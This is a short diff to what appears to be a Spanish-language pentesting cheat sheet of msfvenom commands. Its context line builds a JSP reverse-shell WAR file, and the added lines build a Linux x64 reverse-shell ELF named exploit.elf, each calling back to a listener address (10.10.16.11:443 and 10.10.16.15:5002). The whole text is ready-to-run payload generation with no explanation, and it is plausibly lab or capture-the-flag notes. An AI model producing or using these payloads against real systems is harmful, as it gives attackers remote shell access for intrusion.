@@ -47,3 +47,8 @@ msfvenom -l payloads
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.11 LPORT=443 -f war -o shell.war
 ```
+
+#### Payload para linux exploit.elf
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.15 LPORT=5002 -f elf -o exploit.elf  
+```
